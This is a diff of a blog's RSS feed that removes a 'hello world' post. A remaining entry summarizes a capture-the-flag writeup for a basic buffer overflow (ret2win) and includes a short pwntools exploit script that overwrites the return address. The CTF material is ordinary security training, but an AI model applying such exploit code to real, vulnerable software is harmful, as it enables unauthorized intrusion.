@@ -64,12 +64,5 @@
       <guid>https://mlowlevl.xyz/writeups/pwn/example-challenge/</guid>
       <description>challenge basic buffer overflow with no PIE and no canary. ret2win.&#xA;solution from pwn import * p = process(&amp;#39;./vuln&amp;#39;) payload = b&amp;#39;A&amp;#39; * 72 + p64(0x401196) p.sendline(payload) p.interactive() got shell.</description>
     </item>
-    <item>
-      <title>hello world</title>
-      <link>https://mlowlevl.xyz/blog/hello-world/</link>
-      <pubDate>Thu, 01 Jan 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/blog/hello-world/</guid>
-      <description>erster post auf dem neuen setup. migrated von github api zu hugo.</description>
-    </item>
   </channel>
 </rss>
